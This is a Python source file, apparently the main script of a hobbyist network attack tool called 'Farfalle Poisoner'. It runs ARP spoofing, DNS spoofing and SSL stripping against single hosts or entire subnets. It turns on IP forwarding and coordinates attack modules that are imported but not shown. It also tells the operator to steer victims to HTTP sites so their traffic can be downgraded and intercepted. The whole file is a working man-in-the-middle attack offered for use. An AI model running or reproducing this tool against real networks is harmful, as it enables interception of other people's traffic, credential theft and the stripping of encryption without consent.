import argparse
import logging
import time
import sys
import os
import subprocess
import ipaddress
from scapy.layers.inet import IP

from modules.arp_spoofer import ARPSpoofer
from modules.dns_spoofer import DNSSpoofer
from modules.ssl_stripper import SSLStripper
from utils.network_scanner import NetworkScanner
from utils.packet_handler import PacketHandler

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('FarfallePoisoner')

# So important B) would like to use it more but sigh idk maybe later
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    HAS_COLOR = False

    class Dummy:
        def __getattr__(self, name): return ""
    Fore = Style = Dummy()


class FarfallePoisoner:
    """ONE FARFALLE VONGOLE PLZ"""

    def __init__(self):
        self.args = self._parse_arguments()
        self.interface = self.args.interface
        self.target_ips = self._parse_targets(self.args.target)
        self.gateway_ip = self.args.gateway
        self.mode = self.args.mode
        self.verbose = self.args.verbose

        if self.verbose:
            logging.getLogger().setLevel(logging.DEBUG)
        elif self.args.silent:
            logging.getLogger().setLevel(logging.ERROR)

        # Initialize components
        self.scanner = NetworkScanner(self.interface)
        self.packet_handler = PacketHandler(
            self.interface, self.gateway_ip, self.target_ips)

        self.arp_spoofers = {}  # mapahash
        self.dns_spoofer = None
        self.ssl_stripper = None

        if self.mode in ['arp', 'all']:
            try:
                for target_ip in self.target_ips:
                    self.arp_spoofers[target_ip] = ARPSpoofer(
                        interface=self.interface,
                        target_ip=target_ip,
                        gateway_ip=self.gateway_ip,
                        packet_handler=self.packet_handler
                    )
            except ValueError as e:
                logger.error(f"Failed to initialize ARP spoofer: {e}")
                sys.exit(1)

        if self.mode in ['dns', 'all']:
            # Parse DNS mapping if provided
            dns_mapping = {}
            if hasattr(self.args, 'dns_domains') and self.args.dns_domains:
                for domain in self.args.dns_domains:
                    dns_mapping[domain] = None  # Will use attacker IP

            self.dns_spoofer = DNSSpoofer(
                interface=self.interface,
                target_ips=self.target_ips,
                dns_mapping=dns_mapping if dns_mapping else None,
                packet_handler=self.packet_handler,
                verbose=self.verbose
            )

        if self.mode in ['ssl', 'all']:
            self.ssl_stripper = SSLStripper(
                interface=self.interface,
                packet_handler=self.packet_handler,
                target_ips=self.target_ips,
                verbose=self.verbose
            )

    def _parse_targets(self, target_str):
        targets = []

        # INPUT MUST BE COMMA SPLIT
        parts = [p.strip() for p in target_str.split(',')]

        for part in parts:
            try:
                # Try to parse as network/subnet
                network = ipaddress.ip_network(part, strict=False)
                # Skip network and broadcast addresses for subnets
                if network.num_addresses > 1:
                    for ip in network.hosts():
                        targets.append(str(ip))
                else:
                    targets.append(str(network.network_address))
            except ValueError:
                # Not a valid network, treat as single IP
                try:
                    ip = ipaddress.ip_address(part)
                    targets.append(str(ip))
                except ValueError:
                    logger.error(f"Invalid IP address or network: {part}")
                    sys.exit(1)

        return targets

    def _parse_arguments(self):
        """Parse command line arguments"""
        parser = argparse.ArgumentParser(
            description='Farfalle Poisoner - ARP/DNS/SSL poisoning tool',
            formatter_class=argparse.ArgumentDefaultsHelpFormatter
        )

        parser.add_argument('-i', '--interface', required=True,
                            help='Network interface to use (e.g., eth0, wlan0, en0)')
        parser.add_argument('-t', '--target', required=True,
                            help='Target IP(s) to poison. Supports: single IP (192.168.1.5), multiple IPs (192.168.1.5,192.168.1.6), or subnet (192.168.1.0/24)')
        parser.add_argument('-g', '--gateway', required=True,
                            help='Gateway IP address')
        parser.add_argument('-m', '--mode', default='all',
                            choices=['arp', 'dns', 'ssl', 'all'],
                            help='Attack mode')
        parser.add_argument('-v', '--verbose', action='store_true',
                            help='Enable verbose output')
        parser.add_argument('--silent', action='store_true',
                            help='Minimize output (only errors)')
        parser.add_argument('--scan', action='store_true',
                            help='Scan network for hosts before starting')
        parser.add_argument('--dns-domains', nargs='+',
                            help='Additional domains to spoof (e.g., --dns-domains example.com test.com)')

        return parser.parse_args()

    def _scan_network(self):
        """Scan network for available hosts"""
        # Determine network range from gateway IP
        gateway_parts = self.gateway_ip.split('.')
        network_range = f"{'.'.join(gateway_parts[:3])}.0/24"

        logger.info(f"Scanning network {network_range}...")
        hosts = self.scanner.scan(network_range)

        if hosts:
            if self.verbose:
                logger.info(f"Found {len(hosts)} hosts:")
                for host in hosts:
                    logger.info(f"  {host['ip']:<15} - {host['mac']}")
            else:
                logger.info(f"Found {len(hosts)} hosts on network")
        else:
            logger.warning("No hosts found on network")

    def start(self):
        """Start the attack based on selected mode"""

        if self.args.scan:
            self._scan_network()
            if not input("Continue with attack? (y/n): ").lower().startswith('y'):
                return

        logger.info(f"Starting Farfalle Poisoner in {self.mode} mode")
        logger.info(
            f"Targets: {', '.join(self.target_ips)} ({len(self.target_ips)} hosts)")
        logger.info(f"Gateway: {self.gateway_ip}")

        try:
            # Enable IP forwarding
            self._enable_ip_forwarding()

            # For SSL stripping, we need ARP spoofing active for the MITM
            if self.mode == 'ssl' and not self.arp_spoofers:
                logger.info(
                    "SSL stripping requires ARP spoofing - enabling it")
                for target_ip in self.target_ips:
                    self.arp_spoofers[target_ip] = ARPSpoofer(
                        interface=self.interface,
                        target_ip=target_ip,
                        gateway_ip=self.gateway_ip,
                        packet_handler=self.packet_handler
                    )

            # For DNS spoofing with SSL stripping, we need both ARP and DNS
            if self.mode in ['dns', 'all'] and self.ssl_stripper:
                logger.info("DNS + SSL stripping attack mode activated")
                if not self.arp_spoofers:
                    for target_ip in self.target_ips:
                        self.arp_spoofers[target_ip] = ARPSpoofer(
                            interface=self.interface,
                            target_ip=target_ip,
                            gateway_ip=self.gateway_ip,
                            packet_handler=self.packet_handler
                        )

            # Start packet handler first and NOTE the order of arp -> dns -> ssl is also importante
            self.packet_handler.start()
            time.sleep(1)

            if self.arp_spoofers:
                for target_ip, spoofer in self.arp_spoofers.items():
                    spoofer.start()
                    if self.verbose:
                        logger.info(
                            f"[VONGOLE] ARP spoofing active for {target_ip}")
                logger.info("[VONGOLE] ARP spoofing active")
                time.sleep(2)

            if self.dns_spoofer:
                self.dns_spoofer.start()
                logger.info("[VONGOLE] DNS spoofing active")
                time.sleep(1)

            if self.ssl_stripper:
                self.ssl_stripper.start()
                logger.info("[VONGOLE] SSL stripping active")

                if self.verbose:
                    if self.dns_spoofer:
                        logger.info("NOTE: DNS + SSL Stripping Active!")
                        logger.info(
                            f"1. Domains will resolve to your IP ({self.dns_spoofer.attacker_ip})")
                        logger.info(
                            "2. HTTP traffic will be transparently proxied")
                        logger.info("3. HTTPS redirects will be stripped")
                        logger.info(
                            "Try having the target browse to: http://github.com or http://example.com")
                    else:
                        logger.info(
                            "NOTE: Target must browse HTTP sites for SSL stripping to work!")
                        logger.info(
                            "Try having the target visit: http://example.com")

            logger.info("Buon appetito! Attack is running...")
            logger.info("Press Ctrl+C to stop")

            # Status display loop
            if self.verbose:
                last_stats_time = time.time()
                while True:
                    time.sleep(1)

                    # Show stats every 10 seconds
                    if time.time() - last_stats_time > 10:
                        stats = self.packet_handler.get_stats()
                        status_parts = [
                            f"Forwarded: {stats['forwarded']}", f"Dropped: {stats['dropped']}"]

                        if self.ssl_stripper:
                            status_parts.append(
                                f"SSL Strips: {self.ssl_stripper.stripped_count}")

                        if self.dns_spoofer:
                            status_parts.append(
                                f"DNS Spoofs: {self.dns_spoofer.spoofed_count}")

                        logger.info(f"[Stats] {' | '.join(status_parts)}")
                    last_stats_time = time.time()

        except KeyboardInterrupt:
            logger.info("Stopping attack...")
        except Exception as e:
            logger.error(f"Error during attack: {e}")
        finally:
            self.stop()

    def stop(self):
        """Stop all attacks and clean up"""
        logger.info("Cleaning up...")

        # Stop attack modules in reverse order
        if self.ssl_stripper:
            self.ssl_stripper.stop()

        if self.dns_spoofer:
            self.dns_spoofer.stop()

        if self.arp_spoofers:
            for spoofer in self.arp_spoofers.values():
                spoofer.stop()

        # Stop packet handler
        self.packet_handler.stop()

        # Disable IP forwarding
        self._disable_ip_forwarding()

        logger.info("Attack stopped and cleaned up 🦋")
        logger.info("Grazie! 🍝")

    def _enable_ip_forwarding(self):
        """Enable IP forwarding based on platform"""
        logger.info("Enabling IP forwarding...")

        self.original_ip_forward_state = None

        if sys.platform.startswith("linux"):
            # IPv4
            with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                self.original_ip_forward_state = f.read().strip()
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

            # IPv6
            try:
                with open('/proc/sys/net/ipv6/conf/all/forwarding', 'r') as f:
                    self.original_ipv6_forward_state = f.read().strip()
                os.system("echo 1 > /proc/sys/net/ipv6/conf/all/forwarding")
            except:
                pass

        elif sys.platform == "darwin":
            result = subprocess.run(["sysctl", "net.inet.ip.forwarding"],
                                    capture_output=True, text=True)
            self.original_ip_forward_state = "1" in result.stdout

            if not self.original_ip_forward_state:
                result = os.system("sudo sysctl -w net.inet.ip.forwarding=1")
                if result == 0:
                    logger.info(
                        "IP forwarding enabled on macOS (will restore on exit)")
                else:
                    logger.warning(
                        "Failed to enable IP forwarding - run with sudo!")
            else:
                logger.info("IP forwarding already enabled")

            try:
                os.system("sudo sysctl -w net.inet6.ip6.forwarding=1")
            except:
                pass

        elif sys.platform.startswith("win"):
            logger.warning("Please enable IP forwarding manually on Windows")
        else:
            logger.warning(
                f"Unknown platform {sys.platform} - please enable IP forwarding manually")

    def _disable_ip_forwarding(self):
        """Disable IP forwarding based on platform"""
        logger.info("Restoring IP forwarding state...")

        if sys.platform.startswith("linux"):
            if hasattr(self, 'original_ip_forward_state') and self.original_ip_forward_state == "0":
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                logger.info("IPv4 forwarding restored to disabled")
            if hasattr(self, 'original_ipv6_forward_state') and self.original_ipv6_forward_state == "0":
                os.system("echo 0 > /proc/sys/net/ipv6/conf/all/forwarding")
                logger.info("IPv6 forwarding restored to disabled")
        elif sys.platform == "darwin":
            if hasattr(self, 'original_ip_forward_state') and not self.original_ip_forward_state:
                os.system("sudo sysctl -w net.inet.ip.forwarding=0")
                os.system("sudo sysctl -w net.inet6.ip6.forwarding=0")
                logger.info("IP forwarding restored to disabled")


def print_banner():
    """Print the Farfalle banner"""
    logo = r'''
                  `         '
    ;,,,           `       '             ,,,;
    `YES8888bo.     :     :       .od8888YES'
    888IO8DO88b.     :   :     .d8888I8DO88
    8LOVEY'  `Y8b.   `   '   .d8Y'  `YLOVE8
    jTHEE!  .db.  Yb. '   ' .dY  .db.  8THEE!
    `888  Y88Y    `b ( ) d'    Y88Y  888'
        8MYb  '"        ,',        "'  dMY8
    j8prECIOUSgf"'   ':'   `"?g8prECIOUSk         ONE FARFALLE VONGOLE PLZ
        'Y'   .8'     d' 'b     '8.   'Y'
        !   .8' db  d'; ;`b  db '8.   !
            d88  `'  8 ; ; 8  `'  88b
            d88Ib   .g8 ',' 8g.   dI88b
        :888LOVE88Y'     'Y88LOVE888:
        '! THEE888'       `888THEE !'
            '8Y  `Y         Y'  Y8'
            Y                   Y
            !                   !
    '''

    if HAS_COLOR:
        print(Fore.GREEN + logo)
        print(Fore.YELLOW + "🍝🦋 ONE FARFALLE VONGOLE PLZ 🦋🍝" + Style.RESET_ALL)
        print(Fore.CYAN + "ARP, DNS w SSL capabilities Network Poisoning Tool\n" + Style.RESET_ALL)
    else:
        print(logo)
        print("🍝🦋 ONE FARFALLE VONGOLE PLZ 🦋🍝")
        print("ARP/DNS/SSL Network Poisoning Tool\n")


if __name__ == "__main__":
    print_banner()

    try:
        poisoner = FarfallePoisoner()
        poisoner.start()
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)
